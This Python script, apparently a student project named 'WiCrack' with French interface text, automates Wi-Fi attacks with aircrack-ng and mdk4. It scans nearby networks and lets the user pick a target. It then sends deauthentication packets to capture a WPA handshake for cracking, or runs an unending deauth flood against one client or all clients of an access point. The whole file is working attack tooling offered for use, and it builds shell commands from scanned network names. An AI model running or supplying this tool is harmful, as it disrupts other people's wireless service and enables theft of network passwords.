#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os, sys, subprocess, threading, time, logging
from datetime import datetime
from shutil import which
import importlib.metadata
import questionary
from pyfiglet import figlet_format
import tkinter as tk

# === CONFIGURATION ===
WORK_DIR = "wicrack_output"
REQUIRED_TOOLS_BINARIES = ["airmon-ng", "airodump-ng", "aireplay-ng", "aircrack-ng", "mdk4"]
PACKAGE_MAP = {
    "airmon-ng": "aircrack-ng",
    "airodump-ng": "aircrack-ng",
    "aireplay-ng": "aircrack-ng",
    "aircrack-ng": "aircrack-ng",
    "mdk4": "mdk4",
}

# === Vérification de l'environnement ===
def check_root():
    if os.geteuid() != 0:
        print("\033[91m[!] Ce script doit être exécuté en root.\033[0m")
        sys.exit(1)

def check_system_deps():
    print("\033[94m[~] Vérification des outils système...\033[0m")
    missing_bins = [tool for tool in REQUIRED_TOOLS_BINARIES if which(tool) is None]
    try:
        tk.Tk().withdraw()
    except tk.TclError:
        missing_bins.append("tkinter")

    if not missing_bins:
        print("\033[92m[+] Tous les outils nécessaires sont installés.\033[0m")
        return

    pkgs = {PACKAGE_MAP.get(b, b) for b in missing_bins}
    print(f"\033[93m[!] Paquets manquants : {', '.join(pkgs)}\033[0m")
    if questionary.confirm("Installer automatiquement avec apt ?").ask():
        subprocess.call(f"sudo apt update && sudo apt install -y {' '.join(pkgs)}", shell=True)

# === UI ===
def clear(): os.system('cls' if os.name == 'nt' else 'clear')

def show_banner():
    clear()
    print("\033[96m" + figlet_format("WiCrack", font="slant") + "\033[0m")
    print("\033[92m╔══════════════════════════════════════════════════════════╗")
    print("║   Advanced Wi-Fi Attack Automation Framework             ║")
    print("║   Authors: Fadoua, Fatima Ezzahra, Aya et Melissa :)     ║")
    print("╚══════════════════════════════════════════════════════════╝\033[0m\n")

def fancy_line():
    print("\033[95m───────────────────────────────────────────────────────────\033[0m")

# === Fonctions principales ===
def enter_monitor_mode():
    interfaces = [i for i in os.listdir('/sys/class/net/') if i.startswith('wl')]
    iface = questionary.select("Quelle interface utiliser ?", choices=interfaces).ask()
    print(f"\033[94m[~] Activation du mode moniteur sur {iface}...\033[0m")
    subprocess.call(f"airmon-ng start {iface}", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    iface_mon = iface + "mon"
    if not os.path.exists(f"/sys/class/net/{iface_mon}"):
        iface_mon = iface
        print(f"[!] Interface {iface_mon} supposée en mode moniteur.")
    return iface_mon

def scan_networks(iface):
    print("\033[96m[~] Scan des réseaux en cours...\033[0m")
    print("\033[93m    Appuyez sur [Ctrl+C] pour arrêter le scan.\033[0m")
    output = os.path.join(WORK_DIR, "scan_output")
    os.makedirs(WORK_DIR, exist_ok=True)
    cmd = f"airodump-ng {iface} -w {output} --output-format csv --write-interval 1"
    try:
        subprocess.call(cmd, shell=True)
    except KeyboardInterrupt:
        print("\n\033[92m[+] Scan arrêté.\033[0m")
    return output + "-01.csv"

def parse_csv(file):
    networks, clients = [], []
    try:
        lines = open(file, "r", encoding="utf-8", errors="ignore").readlines()
    except FileNotFoundError:
        return [], []
    client_section = False
    for line in lines:
        if "Station MAC" in line:
            client_section = True
            continue
        parts = [x.strip() for x in line.split(",")]
        if not client_section:
            if len(parts) >= 14 and parts[0] != "BSSID" and parts[13]:
                networks.append({"BSSID": parts[0], "Channel": parts[3], "ESSID": parts[13]})
        else:
            if len(parts) >= 6 and parts[0] and parts[5]:
                clients.append({"Station": parts[0], "BSSID": parts[5], "Power": parts[3]})
    return networks, clients

def select_target(networks):
    fancy_line()
    choices = [f"{n['ESSID']} ({n['BSSID']})" for n in networks]
    sel = questionary.select("Sélectionnez votre cible :", choices=choices).ask()
    return next(n for n in networks if n['ESSID'] in sel)

# === Attaques ===
def perform_handshake_attack(target, iface, output_prefix):
    print("\033[91m[~] Lancement de la capture du handshake...\033[0m")
    cap = output_prefix + "-01.cap"
    airodump = f"airodump-ng --bssid {target['BSSID']} -c {target['Channel']} -w {output_prefix} --write-interval 1 {iface}"
    aireplay = f"aireplay-ng --deauth 10 -a {target['BSSID']} {iface}"
    proc = subprocess.Popen(airodump, shell=True)
    time.sleep(3)
    subprocess.call(aireplay, shell=True)
    print("[~] Désauth envoyée, attente de 10s pour capture...")
    time.sleep(10)
    proc.terminate()
    print("[+] Capture terminée, vérification du handshake...")
    res = subprocess.run(f"aircrack-ng {cap}", shell=True, capture_output=True, text=True)
    if "(1 handshake)" in res.stdout:
        print("\033[92m[+] Handshake détecté !\033[0m")
        return True
    print("\033[91m[!] Aucun handshake trouvé.\033[0m")
    return False

def scan_clients(target, iface):
    """Scanne les clients connectés à un BSSID spécifique."""
    print(f"\033[96m[~] Scan des clients connectés à {target['ESSID']}...\033[0m")
    output = os.path.join(WORK_DIR, "clients_scan")
    cmd = f"airodump-ng --bssid {target['BSSID']} -c {target['Channel']} -w {output} --output-format csv --write-interval 1 {iface}"
    try:
        subprocess.call(cmd, shell=True)
    except KeyboardInterrupt:
        print("\n\033[92m[+] Scan clients arrêté.\033[0m")
    _, clients = parse_csv(output + "-01.csv")
    clients = [c for c in clients if c['BSSID'] == target['BSSID']]
    return clients

def perform_ddos_attack(target, iface, client_mac=None):
    """
    Nouvelle version plus verbeuse / diagnostique :
    - force le canal avec iwconfig
    - teste l'injection (aireplay-ng --test)
    - lance aireplay-ng (verbose) ciblé (-c client) ou broadcast
    - lance mdk4 d -B en parallèle
    - logs dans WORK_DIR pour debug
    """
    essid = target.get('ESSID', '<unknown>')
    bssid = target.get('BSSID')
    channel = str(target.get('Channel'))

    print(f"\033[91m[~] Préparation du DDOS sur {essid} ({bssid}) - canal {channel}\033[0m")
    os.makedirs(WORK_DIR, exist_ok=True)

    # 1) Forcer le canal
    try:
        print(f"[~] Forçage du canal {channel} sur {iface} ...")
        subprocess.run(f"iwconfig {iface} channel {channel}", shell=True, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except subprocess.CalledProcessError:
        print("\033[93m[!] Attention : impossible de forcer le canal avec iwconfig. Vérifier les droits / compatibilité.\033[0m")

    # 2) Test d'injection
    print("[~] Test d'injection (aireplay-ng --test) ...")
    try:
        test = subprocess.run(f"aireplay-ng --test {iface}", shell=True, capture_output=True, text=True, timeout=20)
        print("[~] Résultat du test d'injection :")
        print(test.stdout.strip() or test.stderr.strip())
        if "Injection is working" not in (test.stdout + test.stderr):
            print("\033[93m[!] Injection non confirmée — l'attaque risque d'échouer.\033[0m")
    except subprocess.TimeoutExpired:
        print("\033[93m[!] Le test d'injection a expiré.\033[0m")
    except Exception as e:
        print(f"\033[93m[!] Erreur lors du test d'injection: {e}\033[0m")

    # 3) Construire commandes (verboses + logs)
    safe_name = essid.replace(" ", "_").replace("/", "_")
    aire_log = os.path.join(WORK_DIR, f"aireplay_{safe_name}_{bssid.replace(':','')}.log")
    mdk4_log = os.path.join(WORK_DIR, f"mdk4_{safe_name}_{bssid.replace(':','')}.log")

    if client_mac:
        aireplay_cmd = f"aireplay-ng --deauth 0 -a {bssid} -c {client_mac} {iface} -vv"
        print(f"[~] DDOS ciblé -> client {client_mac}")
    else:
        aireplay_cmd = f"aireplay-ng --deauth 0 -a {bssid} {iface} -vv"
        print("[~] DDOS global (broadcast) -> tous les clients")

    mdk4_cmd = f"mdk4 {iface} d -B {bssid} -c {channel}"

    print(f"[~] Aireplay command: {aireplay_cmd}")
    print(f"[~] mdk4 command: {mdk4_cmd}")
    print(f"[~] Logs: {aire_log} , {mdk4_log}")
    print("\033[91m[!] Appuyez sur Ctrl+C pour arrêter l'attaque.\033[0m")

    # 4) Lancer en parallèle et capturer la sortie
    procs = []
    try:
        aire_f = open(aire_log, "ab")
        mdk4_f = open(mdk4_log, "ab")

        p1 = subprocess.Popen(aireplay_cmd, shell=True, stdout=aire_f, stderr=subprocess.STDOUT)
        procs.append((p1, aire_f))
        # petit délai pour laisser aireplay commencer (utile si interface est occupée)
        time.sleep(0.3)
        p2 = subprocess.Popen(mdk4_cmd, shell=True, stdout=mdk4_f, stderr=subprocess.STDOUT)
        procs.append((p2, mdk4_f))

        # boucle d'attente interrompable
        while True:
            all_dead = True
            for p, _ in procs:
                if p.poll() is None:
                    all_dead = False
            if all_dead:
                break
            time.sleep(0.5)

    except KeyboardInterrupt:
        print("\n[~] Stop demandé par l'utilisateur. Terminaison des processus...")
    finally:
        # terminate / kill si besoin, fermer logs
        for p, fhandle in procs:
            try:
                if p.poll() is None:
                    p.terminate()
                    try:
                        p.wait(timeout=1)
                    except subprocess.TimeoutExpired:
                        p.kill()
            except Exception:
                pass
            try:
                fhandle.close()
            except Exception:
                pass
        print("[~] Attaque arrêtée. Vérifiez les logs pour les détails.")
        print(f"[~] Logs: {aire_log} , {mdk4_log}")


# === Menu principal ===
def main_menu():
    while True:
        show_banner()
        iface = enter_monitor_mode()
        csv = scan_networks(iface)
        nets, _ = parse_csv(csv)
        if not nets:
            print("\033[91m[!] Aucun réseau trouvé.\033[0m")
            time.sleep(2)
            continue
        target = select_target(nets)
        output = os.path.join(WORK_DIR, target['ESSID'].replace(" ", "_"))
        fancy_line()

        attack = questionary.select(
            "Choisissez le type d'attaque :",
            choices=["Handshake", "DDOS", "Quitter"]
        ).ask()

        if attack == "Quitter":
            print("\033[92m[✔] Merci d’avoir utilisé WiCrack. À bientôt !\033[0m")
            break

        try:
            if attack == "Handshake":
                cap = output + "-01.cap"
                if perform_handshake_attack(target, iface, output):
                    print("\033[92m[+] Handshake capturé avec succès.\033[0m")

            elif attack == "DDOS":
                clients = scan_clients(target, iface)
                if clients:
                    choices = [f"{c['Station']} (Power: {c['Power']})" for c in clients]
                    choices.append("Tous les clients (attaque globale)")
                    sel = questionary.select("Choisissez la cible du DDOS :", choices=choices).ask()
                    if "Tous" in sel:
                        client_mac = None
                    else:
                        client_mac = next(c['Station'] for c in clients if c['Station'] in sel)
                    perform_ddos_attack(target, iface, client_mac)
                else:
                    print("\033[93m[!] Aucun client connecté détecté.\033[0m")
                    if questionary.confirm("Voulez-vous effectuer une attaque DDOS globale ?").ask():
                        perform_ddos_attack(target, iface)
        except KeyboardInterrupt:
            print("\n\033[91m[!] Attaque interrompue.\033[0m")

        fancy_line()
        again = questionary.select(
            "Souhaitez-vous effectuer une autre attaque ?",
            choices=["Oui", "Non, quitter"]
        ).ask()
        if again == "Non, quitter":
            print("\033[92m[✔] Merci d’avoir utilisé WiCrack. À bientôt !\033[0m")
            break

# === Lancement ===
if __name__ == "__main__":
    check_root()
    check_system_deps()
    os.makedirs(WORK_DIR, exist_ok=True)
    logging.basicConfig(filename=os.path.join(WORK_DIR, "wicrack.log"),
                        level=logging.INFO, format="%(asctime)s - %(message)s")
    main_menu()

